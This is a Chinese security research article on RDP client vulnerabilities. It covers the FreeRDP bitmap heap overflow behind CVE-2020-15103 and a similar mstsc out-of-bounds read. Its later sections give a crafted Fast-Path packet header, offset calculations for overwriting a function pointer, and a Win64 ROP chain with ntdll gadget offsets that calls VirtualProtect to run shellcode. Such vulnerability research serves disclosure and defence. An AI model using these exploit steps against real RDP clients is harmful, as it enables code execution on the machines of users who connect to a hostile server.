**作者：sunglin@知道创宇404实验室/0103 sec team  
时间：2021年10月9日**

## 0x00 RDP协议的应用

RDP协议（远程桌面协议）是微软公司创建的专有协议，它允许系统用户通过图形界面连接到远程系统，主要分为服务端和客户端，这篇我们来聊聊客户端相关应用与攻击面。
主要流行的应用包括：

mstsc.exe（微软系统自带）

![](https://images.seebug.org/content/images/2021/10/1df9e28a-0704-4172-aa6f-89d3960e5276.png-w331s)

freerdp （最流行且成熟的开源应用 , github star超过5.6k, fork接近10k)

![](https://images.seebug.org/content/images/2021/10/09/1633764414000-image-20211009145650744.png-w331s)

## 0x01 RDP协议通信机制

  1. [MS-RDPBCGR]基于ITU（国际电信联盟）T.120系列协议。T.120标准由一组通信和应用层协议组成，使实施者能够为实时，多点数据连接和会议创建兼容的产品和服务。
  2. [MS-RDPBCGR]协议可通过静态虚拟通道和动态扩展协议建立隧道进行传输；
  3. 其中有9种协议可建立静态虚拟通道包括常用的（剪切板、音频输出、打印虚拟频道、智能卡等）
  4. 其中12种协议可与动态频道虚拟频道扩展[MS-RDPEDYC]建立隧道包括（视频虚拟频道、音频输入、USB设备、图形管道、即插即用设备等等）
  5. 7种协议扩展了[MS-RDPBCGR]并且还包括UDP传输扩展[MS-RDPEUDP]、网关服务器 协议[MS-TSGU]等。

![image-20211009145542821](https://images.seebug.org/content/images/2021/10/09/1633764414000-image-20211009145542821.png-w331s)

## 0x02 RDP协议图像处理通道攻击面

rdp协议中对图形处理中有两种通道，多种方式，协议也是很复杂的

![image-20211009145632231](https://images.seebug.org/content/images/2021/10/09/1633764415000-image-20211009145632231.png-w331s)

## 0x03 攻击msrdp图形处理通道

    
    
    attack fastpath 
    api:
    CCO::OnFastPathOutputReceived(CCO *this, unsigned __int8 *a2, unsigned int a3)
    {
    switch()
    {
    case1:
    CTSCoreGraphics::ProcessBitmap
    .............
    case 9:
    CCM::CM_ColorPointerPDU
    case A:
    case B:
    ............
    }
    }

对此通道进行fuzzing，而后获取到了msrdp的crash：

![image-20211009145808037](https://images.seebug.org/content/images/2021/10/09/1633764415000-image-20211009145808037.png-w331s)

![image-20211009145812444](https://images.seebug.org/content/images/2021/10/09/1633764415000-image-20211009145812444.png-w331s)

## 0x04 简要分析此漏洞

漏洞存在模块mstscax.dll，api是CUH::UHLoadBitmapBits
CUH::UHGetMemBltBits获取存储的bitmap数据时访问到数组边界造成数据越界

![image-20211009145849700](https://images.seebug.org/content/images/2021/10/09/1633764415000-image-20211009145849700.png-w331s)

## 0x05 漏洞相似性分析

msrdp与freerdp存在相同的漏洞？

freerdp CVE-2020-11525

同样的bitmap数组越界当 id == maxCells时将会

数组越界并且和msrdp是同一个漏洞

![image-20211009145918797](https://images.seebug.org/content/images/2021/10/09/1633764415000-image-20211009145918797.png-w331s)

## 0x06 反向攻击客户端的路径和方式

![image-20211009145950721](https://images.seebug.org/content/images/2021/10/09/1633764415000-image-20211009145950721.png-w331s)

## 0x07 漏洞背景

对于rdp图形通道的漏洞，我于7月份的时候向freerdp报告了一枚漏洞，并且freerdp回复了我并分配了cve号
CVE-2020-15103，当时提到的漏洞原因是整数溢出，并且freerdp发布了2.2.0版本修复了我提到的漏洞，重新深入分析了这枚漏洞，发现并不只是整数溢出那么简单，而是freerdp并未正确修复此漏洞，遂即对此漏洞进行了深入分析。

## 0x08 漏洞分析

首先在rdp协议建立连接的时候，server发送Demand Active
PDU协议字段给client的进行功能交换阶段时候，通过以下的图可以看到存在于连接过程的哪一阶段了。

![image-20211009150028968](https://images.seebug.org/content/images/2021/10/09/1633764416000-image-20211009150028968.png-w331s)

freerdp对应处理的代码在rdp.c的回调函数`rdp_recv_callback`中进行连接部分的处理，当rdp->state为`CONNECTION_STATE_CAPABILITIES_EXCHANGE`的时候，将会接收Demand
Active PDU协议字段，继续深入协议字段，Demand Active PDU协议字段将会通过capabilitySets字段来设置每一项功能

capabilitySets (variable): An array of Capability Set (section 2.2.1.13.1.1.1)
structures. The number of capability sets is specified by the
numberCapabilities field

这里关注的是Bitmap Capability Set

![image-20211009150038797](https://images.seebug.org/content/images/2021/10/09/1633764416000-image-20211009150038797.png-w331s)

Bitmap Capability
Set如下，其将会设置字段desktopWidth和desktopHeight，而这两个字段将会用于创建窗口会话，并且会通过这两个字段分配一片内存，而这片内存就是造成后面越界的区域

![image-20211009150047849](https://images.seebug.org/content/images/2021/10/09/1633764416000-image-20211009150047849.png-w331s)

在freerdp中api调用路径如下:

rdp_recv_callback->rdp_client_connect_demand_active->rdp_recv_demand_active->rdp_read_capability_sets->rdp_read_bitmap_capability_set

在rdp_read_bitmap_capability_set函数中将会接收到server端的数据，将会设置desktopWidth和desktopHeight

https://github.com/FreeRDP/FreeRDP/blob/libfreerdp/core/capabilities.c

![image-20211009150059661](https://images.seebug.org/content/images/2021/10/09/1633764416000-image-20211009150059661.png-w331s)

freerdp将会在wf_post_connect中进行一系列的初始化，包括初始化bitmap，api调用路径如下:

wf_post_connect->wf_image_new->wf_create_dib->CreateDIBSection

最后将会调用windows的api CreateDIBSection，CreateDIBSection将会以bmi.bmiHeader.biWidth *
bmi.bmiHeader.biHeight * bmi.bmiHeader.biBitCount创建以4096页为基数的大内存。

https://github.com/FreeRDP/FreeRDP/blob/client/Windows/wf_graphics.c

![image-20211009150110379](https://images.seebug.org/content/images/2021/10/09/1633764417000-image-20211009150110379.png-w331s)

在freerdp建立并初始化完成后，调用下这片内存，并且触发漏洞，通过Fast-Path数据来发送Bitmap
Data，而后freerdp将会利用到初始化的内存，并且没有做任何限制

![image-20211009150122177](https://images.seebug.org/content/images/2021/10/09/1633764417000-image-20211009150122177.png-w331s)

发送的数据头部如下:

    
    
    00,
    
    0x84,0x24,//size = 1060
    
    0x04,
    
    0x1e,0x4, //size - 6 
    
    0x04, 0x00,//cmdType
    
    0x00, 0x00,//marker.frameAction
    
    0xFF, 0xE3, 0x77, 0x04,//marker.frameId
    
    0x01, 0x00,//cmdType
    
    0x00, 0x00, //cmd.destLeft  //  nXDst * 4 
    
    0x00, 0x00, //cmd.destTop  //  nYDst * width
    
    0x00, 0x03,//cmd.destRight
    
    0x04, 0x04,//cmd.destBottom
    
    0x20, //bmp->bpp
    
    0x80,//bmp->flags
    
    0x00,//reserved
    
    0x00, //bmp->codecID
    
    0x00, 0x01, //bmp->width *4
    
    0x01, 0x0, //bmp->height
    
    0x00 ,4,0,0,//bmp->bitmapDataLength

通过特殊制作的头部数据，将会获取如下路径:

rdp_recv_pdu->rdp_recv_fastpath_pdu->fastpath_recv_updates->fastpath_recv_update_data->fastpath_recv_update->update_recv_surfcmds->update_recv_surfcmd_surface_bits->gdi_surface_bits->freerdp_image_copy

先来分析下这个函数`gdi_surface_bits`，在gdi_surface_bits中有三条路径可以解析和处理接收的数据，case
RDP_CODEC_ID_REMOTEFX和case RDP_CODEC_ID_NSCODEC，这两条路径都会将原始数据进行解析转换，然而在case
RDP_CODEC_ID_NONE中，将会直接得到拷贝原始数据的机会。

    
    
    Static BOOL gdi_surface_bits(rdpContext* context, const SURFACE_BITS_COMMAND* cmd)
    
    {
    
    switch(cmd->bmp.codecID)
    
    {
    
        case RDP_CODEC_ID_REMOTEFX:
    
            rfx_process_message();
    
        case RDP_CODEC_ID_NSCODEC:
    
            nsc_process_message();
    
        case RDP_CODEC_ID_NONE:
    
            freerdp_image_copy()
    
    
    
    }
    
    }

最后来到数据越界的函数freerdp_image_copy()，这里的copyDstWidth、nYDst、nDstStep 、xDstOffset
变量都是可控制的，memcpy这里将会越界写

![image-20211009150151366](https://images.seebug.org/content/images/2021/10/09/1633764417000-image-20211009150151366.png-w331s)

这里有个问题，CreateDIBSection分配的是以4096页为基数的大内存，而此片内存并没有在freerdp进程内，即使越界写也很难覆写到freerdp的内存，而这里将desktopWidth或desktopHeight置0的话，将会导致CreateDIBSection分配内存失败，导致失败后将会在gdi_init_primary中进入另一条路径`gdi_CreateCompatibleBitmap`，而这里将会调用`_aligned_malloc`以16字节对称来分配内存，而这里desktopWidth或desktopHeight置0，所以将会分配16字节大小的稳定内存，而这个内存是在freerdp进程内的。

![image-20211009150200592](https://images.seebug.org/content/images/2021/10/09/1633764417000-image-20211009150200592.png-w331s)

## 0x09 假如说能获取信息泄露

假如这里通过自制工具可以泄露堆地址，比如从最轻松简单的开始，通过泄露越界内存的地址，这个结构体就在`gdi_CreateCompatibleBitmap`中调用并分配了将会越界的内存

观察以下结构体将会发现data指针后面将会有个free的函数指针，这里泄露两个地址，GDI_BITMAP结构体的地址和data指针的地址，只要GDI_BITMAP结构体的地址高于data指针的地址，就可以计算出偏移offset，通过设置offset精确的将free覆盖，最后通过主动调用free，这样就可以控制rip了

![image-20211009150208614](https://images.seebug.org/content/images/2021/10/09/1633764417000-image-20211009150208614.png-w331s)

## 0x10 精确计算offset

再来回顾下nYDst 是cmd->destTop,nDstStep 是cmd->bmp.width *
4，xDstOffset为cmd.destLeft*4，copyDstWidth为cmd->bmp.width * 4

    
    
    BYTE* dstLine = &pDstData[(y + nYDst) * nDstStep * dstVMultiplier + dstVOffset];
    
    memcpy(&dstLine[xDstOffset], &srcLine[xSrcOffset], copyDstWidth);

这里offset = gdiBitmap_addr - Bitmapdata_addr;

需要通过设置nYDst * nDstStep *1 + xDstOffset = offset

发送bitmapdata 的数据包括shellcode的大小是1060，头部大小是36

shellcode的布局如下:

![image-20211009150217611](https://images.seebug.org/content/images/2021/10/09/1633764418000-image-20211009150217611.png-w331s)

最后的计算如下:

    
    
    if (gdi_addr > Bitmapdata_addr)
    
    {
    
        eip_offset = gdi_addr - Bitmapdata_addr;
    
        char okdata = eip_offset % 4;
    
        UINT64 copywidth = 1024 * 0xffff;
    
        if (okdata == 0)
    
        {
    
            if (eip_offset < copywidth)
    
            {
    
                eip_offset = eip_offset - 1016 + 32  + 32 + 64; //向后退32 + 64
    
                eip_y = eip_offset % 1024;
    
                eip_ = (eip_offset - eip_y) / 1024;
    
                nXDst = eip_y / 4;
    
            }
    
        }
    
    }

## 0x11 主动调用free

通过发送以上的bitmap_data数据将会控制hBitmap->free,通过发送RDPGFX_RESET_GRAPHICS_PDU消息将会重置，并且会先调用hBitmap->free释放初始化的资源。

![image-20211009150229058](https://images.seebug.org/content/images/2021/10/09/1633764418000-image-20211009150229058.png-w331s)

RDPGFX_RESET_GRAPHICS_PDU消息处理api流程如下:

rdpgfx_on_data_received->rdpgfx_recv_pdu->rdpgfx_recv_reset_graphics_pdu->gdi_ResetGraphics->wf_desktop_resize->gdi_resize_ex->gdi_bitmap_free_ex

![image-20211009150236339](https://images.seebug.org/content/images/2021/10/09/1633764418000-image-20211009150236339.png-w331s)

通过调用hBitmap->free(hBitmap->data)，将会控制rip

## 0x12 在win64上面构造rop链

首先rop链的条件是得通过pop ret来利用栈上面的数据，所以说得控制栈上面的数据才能构造出完整的rop利用链，这里观察了下调用free时的寄存器值:

    
    
    Rax = hBitmap->data rcx = hBitmap->data rdi = rsp + 0x40

hBitmap->data的地址上面的堆数据正是被控制的数据，这里在忽略基址随机化的前提下，在ntdll中通过ROPgadget找到了这样的滑块:

    
    
    48 8B 51 50               mov   rdx, [rcx+50h]
    
    48 8B 69 18               mov   rbp, [rcx+18h]
    
    48 8B 61 10               mov   rsp, [rcx+10h]
    
    FF E2                     jmp   rdx

只要执行这条rop链就可以完美控制rsp，接下来只需要调用win
api来获取一片可执行代码的内存，这里采用最简单的方式就是直接调用virtprotect来改写shellcode存在的内存页为可执行状态，在x86_64上面，调用api都是通过寄存器来传参的，而virtprotect的传参如下:

    
    
    Mov r9d,arg4
    
    Mov r8d,arg3
    
    Mov edx,arg2
    
    Mov ecx,arg1
    
    Call virtprotect

综上所述，我的rop链代码是这样构造的:

    
    
    UINT64 rop1 = 0x00000000000A2C08; //mov rdx, [rcx+50h], mov  rbp, [rcx+18h],mov rsp,    [rcx+10h],jmp rdx
    
    UINT64 rop2 = 0x00008c4b4;    // ntdll pop r9 pop r10 pop r11 ret
    
    UINT64 rop3 = 0x8c4b2;      //ntdll pop r8 ; pop r9 ; pop r10 ; pop r11 ; ret
    
    UINT64 rop4 = 0xb416;      //ntdll pop rsp ret
    
    UINT64 rop5 = 0x8c4b7;     //ntdll pop rdx; pop r11; ret
    
    UINT64 rop6 = 0x21597;    //ntdll pop rcx; ret
    
    UINT64 rop7 = 0x64CC0;    //virtprotect
    
    UINT64 shellcode_addr = ntdll_Base_Addr + rop1;
    
    UINT64 rsp_godget = gdi_addr - 104;
    
    memcpy(&shellcode[956], &shellcode_addr, sizeof(shellcode_addr));//向后退32 + 64 rop   之rsp控制栈
    
    memcpy(&shellcode[948], &gdi_addr, sizeof(gdi_addr));      //控制rcx
    
    memcpy(&shellcode[940], &rsp_godget, sizeof(rsp_godget));   //rsp赋值
    
    shellcode_addr = ntdll_Base_Addr + rop3;
    
    memcpy(&shellcode[1004], &shellcode_addr, sizeof(shellcode_addr));//jmp rdx赋值,rop   开始执行
    
    shellcode_addr = ntdll_Base_Addr + rop5;       //rop 栈赋值rdx
    
    UINT64 ret1 = 924 - 72;
    
    memcpy(&shellcode[ret1], &shellcode_addr, sizeof(shellcode_addr));
    
    shellcode_addr = ntdll_Base_Addr + rop6;   //rop re2
    
    UINT64 ret2 = 924 - 48;
    
    memcpy(&shellcode[ret2], &shellcode_addr, sizeof(shellcode_addr));
    
    shellcode_addr = KERNEL32Base_Addr + rop7;  //rop re3
    
    UINT64 ret3 = 924 - 32;
    
    memcpy(&shellcode[ret3], &shellcode_addr, sizeof(shellcode_addr));
    
    UINT64 virtprotect_arg4 = 924 - 96;
    
    shellcode_addr = gdi_addr - 112;      //rop virtprotect_arg4
    
    memcpy(&shellcode[virtprotect_arg4], &shellcode_addr, sizeof(shellcode_addr));
    
    UINT64 virtprotect_arg1 = 924 - 40;
    
    shellcode_addr = gdi_addr - 888;    //rop virtprotect_arg4
    
    memcpy(&shellcode[virtprotect_arg1], &shellcode_addr, sizeof(shellcode_addr));
    
    memcpy(&shellcode[900], &shellcode_addr, sizeof(shellcode_addr)); //ret to shellcode
    
    respose_to_rdp_client(shellcode, 1060);//attack heap overflow

通过rop链到执行shellcode，寄存器rdi的值都没有被改写，所以最后在执行shellcode的时候，可以通过rdi来恢复栈地址，这里是通过最简单的方式了:

`Mov rsp,rdi`

最后执行shellcode。

请勿用于其他途径。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1734/>

